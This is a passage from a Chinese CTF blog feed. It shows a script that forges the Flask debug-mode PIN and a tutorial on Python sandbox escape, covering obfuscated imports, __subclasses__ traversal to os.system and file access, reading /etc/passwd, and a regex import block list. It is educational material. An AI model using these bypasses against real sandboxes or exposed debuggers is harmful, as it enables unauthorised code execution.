class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pin_and_cookie_name</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">       <span class="comment">#username,</span></span><br><span class="line">       <span class="comment">#modname,</span></span><br><span class="line">       <span class="comment">#getattr(app, '__name__', getattr(app.__class__, '__name__')),</span></span><br><span class="line">       <span class="comment">#getattr(mod, '__file__', None),</span></span><br><span class="line">       <span class="comment">#str(uuid.getnode()),网卡信息转10进制</span></span><br><span class="line">       <span class="comment">#get_machine_id(),注册表信息</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    h = hashlib.md5()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> probably_public_bits:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(bit,str):</span><br><span class="line">            bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don't</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">        num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don't have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                              <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> get_pin_and_cookie_name()</span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="https://www.cnblogs.com/shengulong/p/8072318.html" target="_blank" rel="noopener">flask的debug模式下，网页输入pin码进行调试</a></p><p><a href="https://zhuanlan.zhihu.com/p/32336971" target="_blank" rel="noopener">Flask debug 模式 PIN 码生成机制安全性研究笔记</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Flask 在debug模式下会生成PIN码&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@zo1ro-ubuntu:/var/www/html/flask# python app.py&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; \* Serving Flask app &quot;app&quot; (lazy loading)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; \* Environment: production&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   WARNING: Do not use the development server in a production environment.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   Use a production WSGI server instead.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; \* Debug mode: on&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; \* Running on http://0.0.0.0:2333/ (Press CTRL+C to quit)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; \* Restarting with stat&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; \* Debugger is active!&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; \* Debugger PIN: 251-181-066&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Python沙盒逃逸</title>
    <link href="https://zo1ro.github.io/2018/09/14/py-sandbox/"/>
    <id>https://zo1ro.github.io/2018/09/14/py-sandbox/</id>
    <published>2018-09-14T13:40:24.000Z</published>
    <updated>2019-05-09T16:35:30.263Z</updated>
    
    <content type="html"><![CDATA[<h2 id="沙盒逃逸简介"><a href="#沙盒逃逸简介" class="headerlink" title="沙盒逃逸简介"></a>沙盒逃逸简介</h2><p>沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程</p><p>对于python的沙箱逃逸而言,我们来实现目的的最终想法有以下几个</p><ul><li>使用os包中的popen,system两个函数来直接执行shell</li><li>使用commands模块中的方法</li><li>使用subprocess</li><li>使用写文件到指定位置,再使用其他辅助手段</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接输入shell命令,以ifconfig举例</span></span><br><span class="line">os.system(<span class="string">'ifconfig'</span>)</span><br><span class="line">os.popen(<span class="string">'ifconfig'</span>)</span><br><span class="line">commands.getoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">subprocess.call([<span class="string">'ifconfig'</span>],shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure> <a id="more"></a><p>但一般题目中会有各种过滤，禁止用户引用敏感的包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = open(<span class="string">'code.py'</span>).read()</span><br><span class="line">pattern  = re.compile(<span class="string">'import\s+(os|commands|subprocess|sys)'</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"forbidden module import detected"</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure><p>python中导入模块有以下几种方式</p><ol><li><code>import xxx</code></li><li><code>from xxx import *</code></li><li><code>__import__(&#39;xxx&#39;)</code></li></ol><p>而我们绕过敏感包就必须使用其他引用方式</p><ol><li><code>import 关键字</code></li><li><code>__import__函数</code></li><li><code>importlib库</code></li></ol><p>import 是一个关键字,因此,包的名字是直接以 ‘tag’(标记)的方式引入的,但是对于函数和包来说,引入的包的名字就是他们的参数,也就是说,将会以字符串的方式引入<br>我们可以对原始关键字做出种种处理来bypass掉源码扫描</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//__import__函数bypass</span><br><span class="line"><span class="keyword">print</span> __import__(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>)).getoutput(<span class="string">'ipconfig'</span>)</span><br><span class="line"></span><br><span class="line">//importlib库bypass</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">print</span> importlib.import_module(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>).getoutput(<span class="string">'ifconfig'</span>)</span><br></pre></td></tr></table></figure><h2 id="沙盒逃逸各种方法"><a href="#沙盒逃逸各种方法" class="headerlink" title="沙盒逃逸各种方法"></a>沙盒逃逸各种方法</h2><p>在python中，不用引入直接使用的内置函数称为 builtin 函数（内联函数），随着<strong>builtin</strong>这一个 module 自动被引入到环境中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//函数调用执行</span><br><span class="line">__builtin__.open()</span><br><span class="line">__builtin__.int()</span><br><span class="line">__builtin__.chr()</span><br></pre></td></tr></table></figure><p>(在python3.x 版本中,<code>__builtin__</code>变成了<code>builtins</code>,而且需要引入)</p><p><img src="1.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//如果一些内联函数在builtins删除 ，我们可以通过reload(__builtins__)重新载入获取一个完整的builtins</span><br><span class="line">//但是,reload也是__builtin__下面的函数,如果直接把它干掉,就没办法重新引入了</span><br><span class="line">//这个时候可以在python中引入一个名为imp的模块</span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br><span class="line">//然后我们就会重新得到完整的__builtin__模块了</span><br></pre></td></tr></table></figure><p>python的object类中集成了很多的基础函数，下面举常见两种方法进入类调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(().__class__.__bases__[<span class="number">0</span>])</span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>])</span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>]</span><br><span class="line"></span><br><span class="line">//存在hook函数可直接调用</span><br></pre></td></tr></table></figure><p><img src="2.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//其中存在file类</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;type <span class="string">'file'</span>&gt;</span><br><span class="line"></span><br><span class="line">//可直接进行文件操作</span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'E:\zo1ro.md'</span>).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/zo1ro.html'</span>, <span class="string">'w'</span>).write(<span class="string">'helloworld'</span>)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ifconfig").read()'</span> )</span><br></pre></td></tr></table></figure><p>在os模块被屏蔽后，可通过其他子类进行调用os模块进行命令执行和文件读写</p><p>这里举例通过warnings.catch_warnings类调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> warnings</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</span><br><span class="line"><span class="number">60</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.<span class="title">WarningMessage</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span><span class="params">()</span>[59].<span class="title">__init__</span>.<span class="title">func_globals</span>.<span class="title">keys</span><span class="params">()</span></span></span><br><span class="line">['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']</span><br><span class="line"></span><br><span class="line">//这里找到linecache，linecache 模块的作用是将文件内容读取到内存中</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals.keys().index(<span class="string">'linecache'</span>)</span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__.keys()</span><br><span class="line">[<span class="string">'updatecache'</span>, <span class="string">'clearcache'</span>, <span class="string">'__all__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__file__'</span>, <span class="string">'cache'</span>, <span class="string">'checkcache'</span>, <span class="string">'getline'</span>, <span class="string">'__package__'</span>, <span class="string">'sys'</span>, <span class="string">'getlines'</span>, <span class="string">'__name__'</span>, <span class="string">'os'</span>, <span class="string">'__doc__'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>]</span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'C:\Python27\lib\os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].__dict__.keys().index(<span class="string">'system'</span>)</span><br><span class="line"><span class="number">79</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].__dict__.keys()[<span class="number">79</span>]</span><br><span class="line"><span class="string">'system'</span></span><br><span class="line"></span><br><span class="line">//调用system函数进行命令执行</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].__dict__.values()[<span class="number">79</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a(<span class="string">'ipconfig'</span>)</span><br></pre></td></tr></table></figure><h3 id="其他的一些执行函数"><a href="#其他的一些执行函数" class="headerlink" title="其他的一些执行函数"></a><strong>其他的一些执行函数</strong></h3><ul><li><strong>timeit</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> timeit</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timeit.timeit(<span class="string">"__import__('os').system('ipconfig')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>exec&amp;eval</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">'__import__("os").system("ipconfig")'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>exec(<span class="string">'__import__("os").system("ipconfig")'</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>platform</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> platform</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> platform.popen(<span class="string">'ipconfig'</span>).read()</span><br></pre></td></tr></table></figure><ul><li><strong>变量替换</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = open</span><br><span class="line">print(a(<span class="string">"/etc/passwd"</span>).read())</span><br></pre></td></tr></table></figure><ul><li><strong>函数名后面加点空格换一行</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> open</span><br><span class="line">(<span class="string">"/etc/passwd"</span>).read()</span><br></pre></td></tr></table></figure><ul><li><strong>使用第三方库的执行命令的函数</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//如果程序中调用了第三方的库，恰好这个库有执行命令的函数，那么肯定是再好不过了</span><br><span class="line"><span class="keyword">from</span> numpy.distutils.exec_command <span class="keyword">import</span> _exec_command <span class="keyword">as</span> system</span><br><span class="line">system(<span class="string">"ls /"</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>使用别名</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="keyword">as</span> o</span><br></pre></td></tr></table></figure><ul><li><strong>字符串拼接</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"l"</span>+<span class="string">"s"</span></span><br><span class="line"><span class="string">"func_global"</span>+<span class="string">"s"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">72</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">'os'</span>].system(<span class="string">'ipconfig'</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>字符串编码或者其他操作</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//如果过滤的是键值对中的key(为了强调是字符串类型)</span><br><span class="line">//方法一：使用编码的转换</span><br><span class="line">&gt;&gt;&gt;<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)</span><br><span class="line">//方法二：使用python的字符串操作</span><br><span class="line">&gt;&gt;&gt;s = <span class="string">"emit"</span></span><br><span class="line">&gt;&gt;&gt;s = s [::<span class="number">-1</span>]</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> a[s]</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">关于Python sec的一些简单的总结</a></p><p><a href="http://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/" target="_blank" rel="noopener">【VULNERABLITY】python sandbox escape</a></p><p><a href="https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="noopener">python沙箱逃逸小结</a></p><p><a href="https://blog.csdn.net/wy_97/article/details/80393854" target="_blank" rel="noopener">python沙箱逃逸一些套路的小结</a></p><p><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">从一个CTF题目学习Python沙箱逃逸</a></p><p><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">Python沙箱逃逸的n种姿势</a></p><p><a href="http://blog.merl1ng.cc/2018/08/16/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">python沙盒逃逸</a></p><p><a href="http://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener">Python 沙盒逃逸备忘</a></p><p><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">Python 沙盒绕过</a></p><p><a href="http://wulidecade.cn/2018/09/21/python%E6%B2%99%E7%9B%92%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">python沙盒总结</a></p><p><a href="https://wintersun.space/2016/06/08/python%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">python沙盒绕过</a></p><p>记录一下，后补……</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;沙盒逃逸简介&quot;&gt;&lt;a href=&quot;#沙盒逃逸简介&quot; class=&quot;headerlink&quot; title=&quot;沙盒逃逸简介&quot;&gt;&lt;/a&gt;沙盒逃逸简介&lt;/h2&gt;&lt;p&gt;沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程&lt;/p&gt;
&lt;p&gt;对于python的沙箱逃逸而言,我们来实现目的的最终想法有以下几个&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用os包中的popen,system两个函数来直接执行shell&lt;/li&gt;
&lt;li&gt;使用commands模块中的方法&lt;/li&gt;
&lt;li&gt;使用subprocess&lt;/li&gt;
&lt;li&gt;使用写文件到指定位置,再使用其他辅助手段&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; subprocess&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; commands&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 直接输入shell命令,以ifconfig举例&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;os.system(&lt;span class=&quot;string&quot;&gt;&#39;ifconfig&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;os.popen(&lt;span class=&quot;string&quot;&gt;&#39;ifconfig&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span 